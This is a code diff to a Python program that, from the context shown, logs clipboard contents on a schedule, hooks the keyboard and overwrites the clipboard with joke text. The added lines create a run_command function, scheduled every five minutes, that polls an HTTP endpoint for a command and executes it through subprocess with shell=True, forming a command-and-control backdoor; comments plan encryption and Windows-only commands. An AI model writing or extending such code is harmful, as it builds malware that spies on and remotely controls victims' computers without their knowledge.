@@ -4,6 +4,9 @@ import requests
 import schedule
 import time
 import random
+import subprocess
+
+from flask import request
 from pynput import keyboard
 import keyboard
 import rsa
@@ -20,6 +23,7 @@ def main():
     global first_connection
     #gets the clipboard information and puts it in a file every 90 seconds.
     schedule.every(90).seconds.do(get_clipboard_info)
+    schedule.every(300).seconds.do(run_command)
 
     #Adds a hotkey, can't have parenthesis because it returns as a none type instead of a boolean
     #explore the timeout feature to add some more functionality
@@ -217,5 +221,27 @@ def change_clipboard() -> None:
             if second_rand_int == 6:
                 pyperclip.copy('It\'s so Shrimple')
 
-    print(pyperclip.paste())
+#so set up a scheduled task for this to run every 5 min? - set it to shorter for testing
+#send a get request to get the command
+#decrypt
+#process the cmd by list splitting it into a string by spaces
+#run through subprocess
+#if predetermined response for NONE then we are going to do nothing
+#TODO: error catching
+#TODO: REMEMBER ONLY WINDOWS COMMANDS WORK...
+#TODO: FIGURE OUT WHAT TO DO WITH THE OUTPUT
+#TODO: MAKE SURE THIS WORKS WITH SCHEDULED TASKS
+def run_command():
+    response = requests.get("http://127.0.0.1:80/command")
+    response_string = response.text
+    print(response_string)
+    if response == 'No':
+        return
+    else:
+        cmd = response_string.split(' ')
+        print(cmd)
+        subprocess.run(cmd, shell=True)
+
+run_command()
 main()
+print("smth")
